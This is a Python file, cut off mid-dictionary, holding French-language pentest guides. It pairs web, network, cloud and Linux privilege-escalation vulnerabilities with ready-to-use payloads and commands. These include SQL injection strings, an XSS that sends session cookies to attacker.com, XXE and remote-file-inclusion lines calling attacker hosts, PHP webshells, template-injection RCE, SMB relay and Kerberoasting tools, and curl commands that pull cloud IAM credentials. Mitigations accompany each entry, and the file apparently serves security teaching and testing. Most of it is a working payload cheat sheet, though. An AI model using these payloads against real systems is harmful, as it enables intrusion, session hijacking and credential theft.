#!/usr/bin/env python3
"""
Guides de test de vulnérabilités web
Vulnérabilités connues et moins connues avec tutoriels complets
"""

from typing import Dict, List


# Catégories et guides disponibles
GUIDES = {
    "web": {
        "name": "Vulnérabilités Web",
        "description": "Tests de sécurité pour applications web",
        "vulnerabilities": {
            "sqli_basic": {
                "name": "SQL Injection (Basique)",
                "severity": "Critical",
                "description": "Injection SQL de base pour extraire des données",
                "steps": [
                    {
                        "title": "Identification",
                        "description": "Tester les champs de formulaire, paramètres GET/POST",
                        "command": "curl 'https://example.com/login.php?user=admin' OR 1=1--'",
                        "expected_output": "Connexion réussie sans authentification valide ou erreur SQL"
                    },
                    {
                        "title": "Union-based",
                        "description": "Extraire des colonnes avec UNION",
                        "command": "' UNION SELECT 1,2,3,user(),database()--'",
                        "expected_output": "Affichage de données utilisateur ou erreur SQL"
                    },
                    {
                        "title": "Blind SQLi",
                        "description": "Injection SQL aveugle basée sur le temps",
                        "command": "' OR SLEEP(5)--'",
                        "expected_output": "Délai de 5 secondes observé dans la réponse"
                    },
                    {
                        "title": "Extraction données",
                        "description": "Liste toutes les tables",
                        "command": "' UNION SELECT table_name FROM information_schema.tables--'",
                        "expected_output": "Liste des tables de la base de données"
                    }
                ],
                "mitigation": "Utiliser des requêtes préparées (Prepared Statements), validation stricte, principe du moindre privilège"
            },
            "sqli_advanced": {
                "name": "SQL Injection (Avancé)",
                "severity": "Critical",
                "description": "Techniques avancées d'injection SQL (Time-based, Error-based, Second-order)",
                "steps": [
                    {
                        "title": "Time-based Blind",
                        "description": "Injection SQL aveugle basée sur le temps",
                        "command": "' AND IF(1=1,SLEEP(5),0)--'",
                        "expected_output": "Délai de 5 secondes = condition vraie"
                    },
                    {
                        "title": "Error-based",
                        "description": "Exploiter les messages d'erreur pour extraire des données",
                        "command": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--'",
                        "expected_output": "Message d'erreur contenant les données extraites"
                    },
                    {
                        "title": "Second-order SQLi",
                        "description": "Injection SQL stockée et exécutée plus tard",
                        "command": "username: '; DROP TABLE users--",
                        "expected_output": "Table supprimée lors d'une action ultérieure"
                    },
                    {
                        "title": "NoSQL Injection",
                        "description": "Injection NoSQL pour MongoDB, CouchDB, etc.",
                        "command": '{"username": {"$ne": null}, "password": {"$ne": null}}',
                        "expected_output": "Bypass d'authentification"
                    }
                ],
                "mitigation": "ORM avec paramètres liés, whitelist des caractères, échappement strict, WAF"
            },
            "xss_stored": {
                "name": "Cross-Site Scripting (XSS) - Stocké",
                "severity": "High",
                "description": "XSS stocké qui persiste dans la base de données",
                "steps": [
                    {
                        "title": "Test basique",
                        "description": "Injecter un script de test",
                        "command": "<script>alert('XSS')</script>",
                        "expected_output": "Pop-up JavaScript s'affiche pour tous les utilisateurs"
                    },
                    {
                        "title": "Exfiltration cookies",
                        "description": "Voler les cookies de session",
                        "command": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                        "expected_output": "Cookies envoyés vers le serveur attaquant"
                    },
                    {
                        "title": "Bypass filtres",
                        "description": "Contourner les filtres avec encodage",
                        "command": "<ScRiPt>alert('XSS')</ScRiPt> ou %3Cscript%3Ealert('XSS')%3C/script%3E",
                        "expected_output": "Exécution du script malgré les filtres"
                    },
                    {
                        "title": "DOM-based XSS",
                        "description": "Exploitation du DOM client-side",
                        "command": "javascript:alert(document.domain)",
                        "expected_output": "Exécution de code côté client via manipulation DOM"
                    }
                ],
                "mitigation": "Échappement et encodage appropriés (OWASP Encoding), Content Security Policy (CSP), validation stricte"
            },
            "xxe": {
                "name": "XML External Entity (XXE)",
                "severity": "Critical",
                "description": "Exploitation des entités externes XML pour lire fichiers et SSRF",
                "steps": [
                    {
                        "title": "Lecture de fichiers",
                        "description": "Extraire des fichiers système",
                        "command": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
                        "expected_output": "Contenu du fichier /etc/passwd affiché dans la réponse"
                    },
                    {
                        "title": "XXE Blind",
                        "description": "Exfiltrer des données sans voir la réponse",
                        "command": """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/data.xml">]><foo>&xxe;</foo>""",
                        "expected_output": "Requête HTTP faite vers le serveur attaquant avec les données"
                    },
                    {
                        "title": "SSRF via XXE",
                        "description": "Server-Side Request Forgery avec XXE",
                        "command": """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server:8080/admin">]><foo>&xxe;</foo>""",
                        "expected_output": "Accès à des ressources internes via l'application"
                    },
                    {
                        "title": "XXE Out-of-Band",
                        "description": "Utiliser DNS pour exfiltrer des données",
                        "command": """<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>""",
                        "expected_output": "Données encodées en base64 exfiltrées"
                    }
                ],
                "mitigation": "Désactiver l'évaluation des entités externes DTD, whitelist des schémas XML, utiliser JSON/Protobuf"
            },
            "ssrf": {
                "name": "Server-Side Request Forgery (SSRF)",
                "severity": "High",
                "description": "Forcer le serveur à faire des requêtes vers des ressources internes",
                "steps": [
                    {
                        "title": "Test basique",
                        "description": "Accéder à localhost",
                        "command": "url=http://127.0.0.1/",
                        "expected_output": "Réponse de services internes (apache, nginx, etc.)"
                    },
                    {
                        "title": "Accès Cloud Metadata",
                        "description": "Accéder aux metadata AWS/GCP/Azure",
                        "command": "url=http://169.254.169.254/latest/meta-data/",
                        "expected_output": "Tokens et credentials cloud exposés"
                    },
                    {
                        "title": "Scan interne",
                        "description": "Scanner des ports internes",
                        "command": "url=http://127.0.0.1:8080/admin, http://127.0.0.1:27017",
                        "expected_output": "Découverte de services internes (MongoDB, admin panels, etc.)"
                    },
                    {
                        "title": "Bypass filtres",
                        "description": "Contourner les filtres avec encodage",
                        "command": "url=http://2130706433/ ou url=http://0x7f000001/",
                        "expected_output": "Accès à localhost malgré les filtres"
                    }
                ],
                "mitigation": "Whitelist des URLs, validation stricte, rejet de localhost/IPs privées, network segmentation"
            },
            "csrf": {
                "name": "Cross-Site Request Forgery (CSRF)",
                "severity": "Medium",
                "description": "Forcer un utilisateur authentifié à exécuter des actions non désirées",
                "steps": [
                    {
                        "title": "Création de la charge utile",
                        "description": "Générer une requête forgée",
                        "command": """<img src="https://victim-site.com/admin/delete-user?user=123" />""",
                        "expected_output": "Action exécutée si l'utilisateur est authentifié"
                    },
                    {
                        "title": "Formulaire forgé",
                        "description": "Form POST forgé",
                        "command": """<form action="https://victim-site.com/transfer-funds" method="POST">
<input name="amount" value="1000">
<input name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>""",
                        "expected_output": "Transfert de fonds effectué automatiquement"
                    },
                    {
                        "title": "Test avec Burp",
                        "description": "Générer une PoC avec Burp",
                        "command": "Burp Suite > Engagement tools > Generate CSRF PoC",
                        "expected_output": "HTML généré pour tester la vulnérabilité"
                    },
                    {
                        "title": "Bypass tokens",
                        "description": "Contourner des tokens CSRF faibles",
                        "command": "Si le token est prévisible : deviner ou réutiliser un ancien",
                        "expected_output": "Bypass du token CSRF"
                    }
                ],
                "mitigation": "Tokens CSRF uniques et aléatoires, SameSite cookies, vérification de l'origine (Origin/Referer)"
            },
            "rce": {
                "name": "Remote Code Execution (RCE)",
                "severity": "Critical",
                "description": "Exécution de code arbitraire sur le serveur via command injection, désérialisation, etc.",
                "steps": [
                    {
                        "title": "Command Injection - Basic",
                        "description": "Exécution de commande système via injection OS",
                        "command": "127.0.0.1; ls -la ou | whoami ou && cat /etc/passwd",
                        "expected_output": "Commande système exécutée, résultat affiché"
                    },
                    {
                        "title": "PHP eval() RCE",
                        "description": "Exploiter eval() en PHP",
                        "command": "<?php system('whoami'); ?> ou <?=exec('id')?>",
                        "expected_output": "Code PHP exécuté, résultat affiché"
                    },
                    {
                        "title": "Deserialization",
                        "description": "Insecure Deserialization RCE",
                        "command": "Payload spécifique selon la technologie (Python pickle, Java, PHP)",
                        "expected_output": "Code exécuté lors de la désérialisation"
                    },
                    {
                        "title": "Expression Language Injection",
                        "description": "Exploiter les expressions server-side (Spring EL, OGNL, etc.)",
                        "command": "${application.getRuntime().exec('calc')} ou ${param.foo}",
                        "expected_output": "Expression évaluée et exécutée"
                    }
                ],
                "mitigation": "Input validation stricte, whitelist des commandes autorisées, sandboxing, désactiver eval(), sérialisation sécurisée"
            },
            "idor": {
                "name": "Insecure Direct Object Reference (IDOR)",
                "severity": "Medium-High",
                "description": "Accès non autorisé à des objets via manipulation d'ID",
                "steps": [
                    {
                        "title": "Test basique",
                        "description": "Changer l'ID d'utilisateur",
                        "command": "GET /api/users/123 -> GET /api/users/1",
                        "expected_output": "Accès aux données d'un autre utilisateur"
                    },
                    {
                        "title": "Mass enumeration",
                        "description": "Énumérer tous les IDs",
                        "command": "for i in {1..1000}; do curl https://site.com/api/user/$i; done",
                        "expected_output": "Liste de tous les utilisateurs/enregistrements"
                    },
                    {
                        "title": "Horizontal privilege escalation",
                        "description": "Accéder aux ressources d'un autre utilisateur du même niveau",
                        "command": "GET /api/users/other-user-id/documents",
                        "expected_output": "Documents d'autres utilisateurs accessibles"
                    },
                    {
                        "title": "Vertical privilege escalation",
                        "description": "Accéder aux ressources d'un rôle supérieur",
                        "command": "GET /api/admin/users -> GET /api/super-admin/secrets",
                        "expected_output": "Accès aux fonctionnalités admin"
                    }
                ],
                "mitigation": "Contrôles d'autorisation côté serveur, UUIDs au lieu d'IDs séquentiels, validation des permissions"
            },
            "file_upload": {
                "name": "File Upload Vulnérabilité",
                "severity": "High-Critical",
                "description": "Upload de fichiers malveillants (webshell, backdoor)",
                "steps": [
                    {
                        "title": "Test upload simple",
                        "description": "Uploader un fichier malveillant",
                        "command": "<?php system($_GET['cmd']); ?>",
                        "expected_output": "Shell web installé sur le serveur"
                    },
                    {
                        "title": "Bypass extension",
                        "description": "Contourner les filtres d'extension",
                        "command": "shell.php.jpg ou shell.php%00 ou shell.php%0a",
                        "expected_output": "Fichier PHP exécuté malgré l'extension"
                    },
                    {
                        "title": "Polyglot file",
                        "description": "Fichier GIF/JPEG polyglotte",
                        "command": "GIF89a<?php system($_GET['cmd']); ?>",
                        "expected_output": "Fichier accepté comme image mais exécuté comme PHP"
                    },
                    {
                        "title": "Webshell via upload",
                        "description": "Uploader un webshell (Weevely, C99)",
                        "command": "weevely generate password /tmp/backdoor.php",
                        "expected_output": "Backdoor fonctionnelle installée"
                    }
                ],
                "mitigation": "Whitelist des types MIME, scanner antivirus, stockage hors webroot, renommage aléatoire"
            },
            "lfi_rfi": {
                "name": "Local/Remote File Inclusion",
                "severity": "High-Critical",
                "description": "Lire des fichiers locaux ou inclure des fichiers distants",
                "steps": [
                    {
                        "title": "LFI basique",
                        "description": "Lire /etc/passwd",
                        "command": "page=../../../etc/passwd",
                        "expected_output": "Contenu du fichier système affiché"
                    },
                    {
                        "title": "RFI",
                        "description": "Inclure un fichier distant",
                        "command": "page=http://attacker.com/shell.txt",
                        "expected_output": "Code distant exécuté sur le serveur"
                    },
                    {
                        "title": "LFI avec wrapper",
                        "description": "Utiliser des wrappers PHP",
                        "command": "page=php://filter/convert.base64-encode/resource=index.php",
                        "expected_output": "Code source PHP encodé en base64"
                    },
                    {
                        "title": "LFI + RCE",
                        "description": "LFI vers RCE",
                        "command": "page=/var/log/apache2/access.log avec User-Agent: <?php system($_GET['cmd']); ?>",
                        "expected_output": "RCE via inclusion de logs"
                    }
                ],
                "mitigation": "Whitelist des fichiers inclus, validation stricte, désactiver allow_url_include"
            },
            "api_misconfig": {
                "name": "Défaillances API",
                "severity": "Medium-High",
                "description": "Mauvaises configurations et vulnérabilités API",
                "steps": [
                    {
                        "title": "Bypass rate limiting",
                        "description": "Contourner les limites de taux",
                        "command": "X-Forwarded-For: 127.0.0.1 ou utiliser plusieurs IPs",
                        "expected_output": "Limite contournée, requêtes illimitées"
                    },
                    {
                        "title": "Mass assignment",
                        "description": "Assignation massive de champs",
                        "command": '{"username":"user","password":"pass","role":"admin","is_admin":true}',
                        "expected_output": "Privilèges admin obtenus"
                    },
                    {
                        "title": "BOLA (IDOR API)",
                        "description": "Broken Object Level Authorization",
                        "command": "GET /api/users/others-user-id",
                        "expected_output": "Accès aux ressources d'autres utilisateurs"
                    },
                    {
                        "title": "GraphQL Introspection",
                        "description": "Énumérer le schéma GraphQL",
                        "command": '{"query":"{__schema{types{name}}}"}',
                        "expected_output": "Schéma complet exposé"
                    }
                ],
                "mitigation": "Rate limiting robuste, validation côté serveur, autorisation stricte, désactiver introspection en prod"
            },
            "business_logic": {
                "name": "Défaillances de logique métier",
                "severity": "Medium-High",
                "description": "Exploiter des failles dans la logique applicative",
                "steps": [
                    {
                        "title": "Prix négatif",
                        "description": "Vendre à prix négatif",
                        "command": 'POST /cart {"item":"product","price":-100}',
                        "expected_output": "Argent crédité au compte"
                    },
                    {
                        "title": "Race condition",
                        "description": "Condition de course sur les paiements",
                        "command": "Envoyer plusieurs requêtes simultanées pour une transaction",
                        "expected_output": "Produit obtenu plusieurs fois pour un seul paiement"
                    },
                    {
                        "title": "Workflow bypass",
                        "description": "Contourner le workflow d'approbation",
                        "command": "POST directement à l'étape finale en sautant l'approbation",
                        "expected_output": "Action validée sans approbation"
                    },
                    {
                        "title": "Repudiation",
                        "description": "Nier une transaction",
                        "command": "Annuler après crédit mais avant débit",
                        "expected_output": "Argent obtenu gratuitement"
                    }
                ],
                "mitigation": "Validation stricte métier, transactions atomiques, audit logs complets, contrôles multi-étapes"
            },
            "host_header_injection": {
                "name": "Host Header Injection",
                "severity": "Medium-High",
                "description": "Exploiter l'en-tête Host pour des attaques",
                "steps": [
                    {
                        "title": "Test basique",
                        "description": "Manipuler l'en-tête Host",
                        "command": "Host: attacker.com",
                        "expected_output": "Redirection ou contenu généré avec domaine malveillant"
                    },
                    {
                        "title": "Password reset poisoning",
                        "description": "Empoisonner les liens de réinitialisation",
                        "command": "Host: attacker.com lors de la demande de reset",
                        "expected_output": "Lien de reset envoyé vers attacker.com"
                    },
                    {
                        "title": "Cache poisoning",
                        "description": "Empoisonner le cache",
                        "command": "Host: evil.com avec contenu xss",
                        "expected_output": "Cache contaminé pour tous les utilisateurs"
                    }
                ],
                "mitigation": "Whitelist des hosts valides, validation stricte, pas de redirections basées sur Host"
            },
            "info_disclosure": {
                "name": "Exposition d'informations sensibles",
                "severity": "Low-Medium",
                "description": "Informations sensibles exposées",
                "steps": [
                    {
                        "title": "Versions exposées",
                        "description": "Versions de logiciels dans headers",
                        "command": "curl -I https://site.com",
                        "expected_output": "Server: Apache/2.4.41, X-Powered-By: PHP/7.2"
                    },
                    {
                        "title": "Backups",
                        "description": "Fichiers backup exposés",
                        "command": "curl https://site.com/.env, .bak, .old, .orig",
                        "expected_output": "Fichiers de backup avec credentials"
                    },
                    {
                        "title": "Comments",
                        "description": "Commentaires dans le code source",
                        "command": "Voir le code source HTML/JS",
                        "expected_output": "Chemins, credentials, endpoints cachés"
                    },
                    {
                        "title": "Directory listing",
                        "description": "Listage de répertoires",
                        "command": "curl https://site.com/uploads/",
                        "expected_output": "Liste de tous les fichiers du répertoire"
                    }
                ],
                "mitigation": "Masquer les versions, désactiver le listing, scanner les backups, minifier le code"
            },
            "clickjacking": {
                "name": "Clickjacking (UI Redressing)",
                "severity": "Low-Medium",
                "description": "Tromper l'utilisateur pour qu'il clique sur des éléments invisibles",
                "steps": [
                    {
                        "title": "PoC basique",
                        "description": "Créer une iframe invisible",
                        "command": """<iframe src="https://victim-site.com/transfer-money" style="opacity:0"></iframe>""",
                        "expected_output": "Transfert effectué sans que l'utilisateur le sache"
                    },
                    {
                        "title": "Framebusting bypass",
                        "description": "Contourner la protection framebusting",
                        "command": "CSS attack ou : sandbox attribute bypass",
                        "expected_output": "iframe fonctionnelle malgré la protection"
                    }
                ],
                "mitigation": "X-Frame-Options: DENY ou SAMEORIGIN, Content-Security-Policy: frame-ancestors 'none'"
            },
            "cors_misconfig": {
                "name": "CORS Misconfiguration",
                "severity": "Medium",
                "description": "Configurations CORS permissives",
                "steps": [
                    {
                        "title": "Wildcard origins",
                        "description": "Origins wildcard permis",
                        "command": "Origin: https://evil.com avec requête API",
                        "expected_output": "Accès autorisé depuis n'importe quelle origine"
                    },
                    {
                        "title": "Null origin",
                        "description": "Origin null autorisé",
                        "command": "Origin: null",
                        "expected_output": "Requêtes acceptées depuis null"
                    },
                    {
                        "title": "Preflight bypass",
                        "description": "Contourner le preflight CORS",
                        "command": "Méthode GET au lieu de POST pour éviter preflight",
                        "expected_output": "Requête réussie sans preflight"
                    }
                ],
                "mitigation": "Whitelist stricte des origines, pas de wildcard, credentials:false si non nécessaire"
            },
            "oauth_issues": {
                "name": "Défaillances OAuth/SSO",
                "severity": "High",
                "description": "Problèmes d'implémentation OAuth/OpenID",
                "steps": [
                    {
                        "title": "Redirect URI manipulation",
                        "description": "Changer redirect_uri",
                        "command": "redirect_uri=https://attacker.com/callback",
                        "expected_output": "Code/token reçu sur serveur attaquant"
                    },
                    {
                        "title": "PKCE bypass",
                        "description": "Bypass PKCE",
                        "command": "Exploiter des implémentations faibles de PKCE",
                        "expected_output": "Autorisation sans PKCE valide"
                    },
                    {
                        "title": "State parameter reuse",
                        "description": "Réutilisation du paramètre state",
                        "command": "Réutiliser un state déjà utilisé",
                        "expected_output": "Bypass de la protection CSRF"
                    }
                ],
                "mitigation": "Validateur de redirect_uri strict, PKCE obligatoire, state unique, scope limité"
            },
            "ssti": {
                "name": "Server-Side Template Injection (SSTI)",
                "severity": "Critical",
                "description": "Injection de code dans des templates serveur (Jinja2, Twig, Freemarker, etc.)",
                "steps": [
                    {
                        "title": "Identification du moteur",
                        "description": "Détecter le template engine utilisé",
                        "command": "{{7*7}}, ${7*7}, #{7*7}, *{7*7}, [%= 7*7 %]",
                        "expected_output": "49 affiché = vulnérabilité confirmée"
                    },
                    {
                        "title": "Jinja2 (Flask/Python)",
                        "description": "Exploiter Jinja2 pour RCE",
                        "command": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                        "expected_output": "Commande système exécutée, résultat affiché"
                    },
                    {
                        "title": "Twig (PHP/Symfony)",
                        "description": "Exploiter Twig pour RCE",
                        "command": "{{['id']|filter('system')|join('')}}",
                        "expected_output": "Commande système exécutée"
                    },
                    {
                        "title": "Freemarker (Java)",
                        "description": "Exploiter Freemarker pour RCE",
                        "command": "<#assign ex=\"freemarker.template.utility.Execute\">${ex(\"id\")}",
                        "expected_output": "Commande système exécutée"
                    },
                    {
                        "title": "Velocity (Java)",
                        "description": "Exploiter Velocity pour RCE",
                        "command": "#set($x=$class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))",
                        "expected_output": "Commande système exécutée"
                    }
                ],
                "mitigation": "Isolation des templates, sandboxing, validation stricte des variables, éviter l'utilisation de templates côté serveur avec input utilisateur"
            },
            "path_traversal": {
                "name": "Path Traversal (Directory Traversal)",
                "severity": "High",
                "description": "Accéder à des fichiers en dehors du répertoire web via ..(/)",
                "steps": [
                    {
                        "title": "Test basique Linux/Unix",
                        "description": "Lire des fichiers système",
                        "command": "../../../../etc/passwd",
                        "expected_output": "Contenu du fichier /etc/passwd affiché"
                    },
                    {
                        "title": "Test Windows",
                        "description": "Lire des fichiers Windows",
                        "command": "..\\..\\..\\..\\windows\\win.ini",
                        "expected_output": "Contenu de win.ini affiché"
                    },
                    {
                        "title": "Encodage URL",
                        "description": "Bypass avec encodage",
                        "command": "..%2f..%2f..%2fetc%2fpasswd ou ..%252f..%252fetc%252fpasswd",
                        "expected_output": "Lecture de fichiers malgré les filtres"
                    },
                    {
                        "title": "Double encodage",
                        "description": "Contourner les filtres avec double encodage",
                        "command": "....//....//etc/passwd ou ..\\..\\windows\\win.ini",
                        "expected_output": "Bypass des protections basiques"
                    },
                    {
                        "title": "Null byte injection",
                        "description": "Terminateur null pour bypass",
                        "command": "../../../../etc/passwd%00.jpg",
                        "expected_output": "Lecture réussie malgré l'extension .jpg"
                    }
                ],
                "mitigation": "Validation stricte des chemins, whitelist des fichiers autorisés, éviter les chemins relatifs, utiliser des ID plutôt que des noms de fichiers"
            },
            "jwt_vuln": {
                "name": "JWT Weaknesses",
                "severity": "High",
                "description": "Vulnérabilités liées aux JSON Web Tokens (algorithme None, secrets faibles, etc.)",
                "steps": [
                    {
                        "title": "Test algorithme None",
                        "description": "Forcer l'algorithme à None pour bypass signature",
                        "command": "Modifier header: {\"alg\":\"none\"} et supprimer signature",
                        "expected_output": "Token accepté sans vérification"
                    },
                    {
                        "title": "HS256 to RS256",
                        "description": "Changer HMAC vers RSA pour utiliser clé publique",
                        "command": "Modifier header: {\"alg\":\"RS256\"} et signer avec clé publique",
                        "expected_output": "Token forgé accepté si clé publique accessible"
                    },
                    {
                        "title": "Brute force secret",
                        "description": "Casser le secret HS256 si faible",
                        "command": "hashcat -a 0 -m 16500 jwt.txt rockyou.txt",
                        "expected_output": "Secret révélé, tokens forgés possibles"
                    },
                    {
                        "title": "JWT secret file",
                        "description": "Accéder au fichier de clé privée",
                        "command": "curl https://site.com/.well-known/jwks.json",
                        "expected_output": "Clés publiques exposées"
                    },
                    {
                        "title": "Expired token",
                        "description": "Tester la validation de la date d'expiration",
                        "command": "Supprimer ou modifier le champ 'exp' dans le payload",
                        "expected_output": "Token expiré encore valide = vulnérabilité"
                    }
                ],
                "mitigation": "Forcer l'algorithme attendu, secrets robustes, validation stricte de l'expiration, rotation de clés, restreindre l'exposition des clés publiques"
            }
        }
    },
    "network": {
        "name": "Vulnérabilités Réseau",
        "description": "Tests de sécurité réseau",
        "vulnerabilities": {
            "smb_relay": {
                "name": "SMB Relay Attack",
                "severity": "High",
                "description": "Relayer des authentifications SMB vers d'autres cibles",
                "steps": [
                    {
                        "title": "Scanner SMB",
                        "description": "Découvrir les services SMB",
                        "command": "nmap -p 445 --script smb-enum-shares 192.168.1.0/24",
                        "expected_output": "Partages SMB découverts"
                    },
                    {
                        "title": "Capturer hash NTLM",
                        "description": "Capturer les hashes NTLM",
                        "command": "Responder -I eth0",
                        "expected_output": "Hash NTLM capturé"
                    },
                    {
                        "title": "Relay attack",
                        "description": "Relayer le hash",
                        "command": "ntlmrelayx.py -tf targets.txt -smb2support",
                        "expected_output": "Accès obtenu via relay attack"
                    }
                ],
                "mitigation": "Signer SMB, désactiver SMBv1, segmentation réseau"
            },
            "kerberoasting": {
                "name": "Kerberoasting",
                "severity": "High",
                "description": "Extraire et casser les hashs TGS Kerberos",
                "steps": [
                    {
                        "title": "Request TGS",
                        "description": "Demander des tickets de service",
                        "command": "impacket-GetNPUsers domain.com/user -dc-ip 192.168.1.10 -request",
                        "expected_output": "Hash TGS obtenu"
                    },
                    {
                        "title": "Cracker hash",
                        "description": "Casser le hash avec Hashcat",
                        "command": "hashcat -m 13100 hash.txt rockyou.txt",
                        "expected_output": "Mot de passe en clair"
                    }
                ],
                "mitigation": "Utiliser AES256, mots de passe forts, comptes de service avec groupes"
            },
            "ftp_anonymous": {
                "name": "FTP Anonymous Access",
                "severity": "Medium",
                "description": "Accès FTP anonyme non sécurisé",
                "steps": [
                    {
                        "title": "Identifier FTP",
                        "description": "Scanner les ports FTP",
                        "command": "nmap -p 21 -sV 192.168.1.0/24",
                        "expected_output": "Services FTP découverts"
                    },
                    {
                        "title": "Test anonyme",
                        "description": "Tenter connexion anonyme",
                        "command": "ftp 192.168.1.10\nlogin: anonymous\npassword: anonymous",
                        "expected_output": "Connexion réussie sans authentification valide"
                    },
                    {
                        "title": "Explorer répertoires",
                        "description": "Lister les fichiers accessibles",
                        "command": "ls -la",
                        "expected_output": "Arborescence de fichiers exposée"
                    }
                ],
                "mitigation": "Désactiver FTP anonyme, utiliser SFTP/FTPS, changer les credentials par défaut"
            },
            "snmp_exposed": {
                "name": "SNMP Exposé",
                "severity": "High",
                "description": "Communautés SNMP exposées (public, private)",
                "steps": [
                    {
                        "title": "Scanner SNMP",
                        "description": "Découvrir les services SNMP",
                        "command": "nmap -p 161 --script snmp-info 192.168.1.0/24",
                        "expected_output": "Services SNMP découverts avec communautés"
                    },
                    {
                        "title": "Enumeration",
                        "description": "Énumérer avec snmpwalk",
                        "command": "snmpwalk -v 2c -c public 192.168.1.10",
                        "expected_output": "Informations système, interfaces, processus exposés"
                    },
                    {
                        "title": "Extraire configs",
                        "description": "Extraire configurations sensibles",
                        "command": "snmpget -v 2c -c public 192.168.1.10 sysDescr.0",
                        "expected_output": "Informations système détaillées"
                    }
                ],
                "mitigation": "Changer les communautés par défaut, filtrer l'accès IP, utiliser SNMPv3 avec chiffrement"
            },
            "rdp_vuln": {
                "name": "RDP Non Sécurisé",
                "severity": "High",
                "description": "RDP sans NLA (Network Level Authentication)",
                "steps": [
                    {
                        "title": "Identifier RDP",
                        "description": "Scanner les ports RDP",
                        "command": "nmap -p 3389 -sV --script rdp-ntlm-info 192.168.1.0/24",
                        "expected_output": "Services RDP découverts"
                    },
                    {
                        "title": "Vérifier NLA",
                        "description": "Tester si NLA est activé",
                        "command": "xfreerdp /u:test /p:test /v:192.168.1.10",
                        "expected_output": "Connexion ou erreur selon configuration"
                    },
                    {
                        "title": "Brute force",
                        "description": "Tenter force brute si NLA désactivé",
                        "command": "hydra -L users.txt -P passwords.txt rdp://192.168.1.10",
                        "expected_output": "Possibilité de force brute"
                    }
                ],
                "mitigation": "Activer NLA, changer port par défaut, account lockout policy, 2FA"
            }
        }
    },
    "cloud": {
        "name": "Vulnérabilités Cloud",
        "description": "Tests de sécurité cloud (AWS, Azure, GCP)",
        "vulnerabilities": {
            "aws_s3_exposed": {
                "name": "Buckets S3 exposés",
                "severity": "Critical",
                "description": "Buckets S3 accessibles publiquement",
                "steps": [
                    {
                        "title": "Lister bucket",
                        "description": "Lister le contenu",
                        "command": "aws s3 ls s3://bucket-name --no-sign-request",
                        "expected_output": "Liste des fichiers du bucket"
                    },
                    {
                        "title": "Télécharger fichier",
                        "description": "Télécharger des fichiers sensibles",
                        "command": "aws s3 cp s3://bucket-name/sensitive.pdf . --no-sign-request",
                        "expected_output": "Fichier téléchargé sans authentification"
                    }
                ],
                "mitigation": "Bucket policies restrictives, pas d'accès public, chiffrement activé, versioning"
            },
            "azure_blob_exposed": {
                "name": "Azure Blob Storage Exposé",
                "severity": "Critical",
                "description": "Conteneurs Azure Blob accessibles publiquement",
                "steps": [
                    {
                        "title": "Identifier conteneurs",
                        "description": "Découvrir les conteneurs Azure",
                        "command": "az storage container list --account-name storageaccount --account-key key",
                        "expected_output": "Liste des conteneurs blob"
                    },
                    {
                        "title": "Liste fichiers",
                        "description": "Lister les fichiers exposés",
                        "command": "az storage blob list --container-name container --account-name storageaccount",
                        "expected_output": "Fichiers sensibles exposés"
                    }
                ],
                "mitigation": "Policies restrictives, accès public désactivé, chiffrement activé"
            },
            "gcp_bucket_exposed": {
                "name": "GCP Bucket Exposé",
                "severity": "Critical",
                "description": "Buckets Google Cloud Storage accessibles publiquement",
                "steps": [
                    {
                        "title": "Identifier buckets",
                        "description": "Découvrir les buckets GCS",
                        "command": "gsutil ls",
                        "expected_output": "Liste des buckets cloud storage"
                    },
                    {
                        "title": "Liste fichiers",
                        "description": "Lister les fichiers",
                        "command": "gsutil ls -r gs://bucket-name",
                        "expected_output": "Arborescence de fichiers exposée"
                    }
                ],
                "mitigation": "Permissions restrictives, chiffrement activé, audit logs"
            },
            "cloud_metadata_exposed": {
                "name": "Cloud Metadata Exposé",
                "severity": "Critical",
                "description": "Metadata cloud exposées (IAM roles, tokens, secrets)",
                "steps": [
                    {
                        "title": "AWS Metadata",
                        "description": "Accéder aux metadata AWS",
                        "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "expected_output": "Credentials IAM exposés"
                    },
                    {
                        "title": "Azure Metadata",
                        "description": "Accéder aux metadata Azure",
                        "command": "curl -H 'Metadata:true' http://169.254.169.254/metadata/identity/oauth2/token",
                        "expected_output": "Tokens d'accès Azure exposés"
                    },
                    {
                        "title": "GCP Metadata",
                        "description": "Accéder aux metadata GCP",
                        "command": "curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "expected_output": "Tokens GCP exposés"
                    }
                ],
                "mitigation": "Restreindre l'accès metadata, utiliser managed identities, rotation de credentials"
            }
        }
    },
    "privesc": {
        "name": "Privilege Escalation",
        "description": "Méthodologie complète pour l'élévation de privilèges",
        "vulnerabilities": {
            "linux_privesc": {
                "name": "Linux Privilege Escalation",
                "severity": "Critical",
                "description": "Méthodologie complète pour obtenir root sur Linux",
                "steps": [
                    {
                        "title": "Vérifications initiales",
                        "description": "Informations système et utilisateur",
                        "command": "id; whoami; uname -a; cat /etc/os-release",
                        "expected_output": "Informations sur l'utilisateur, kernel, distribution"
                    },
                    {
                        "title": "Enumération des privilèges sudo",
                        "description": "Liste des commandes sudo autorisées",
                        "command": "sudo -l",
                        "expected_output": "Commandes sudo sans mot de passe listées"
                    },
                    {
                        "title": "Vérification SUID/SGID",
                        "description": "Recherche binaires SUID/SGID",
                        "command": "find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null",
                        "expected_output": "Liste des binaires SETUID/SETGID"
                    },
                    {
                        "title": "Capabilities Linux",
                        "description": "Vérifier les capabilities privilégiées",
                        "command": "getcap -r / 2>/dev/null",
                        "expected_output": "Capabilities élevées trouvées"
                    },
                    {
                        "title": "Crontab et processus temps réel",
                        "description": "Recherche tâches cron accessibles",
                        "command": "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; crontab -l",
                        "expected_output": "Tâches planifiées avec permissions d'écriture"
                    },
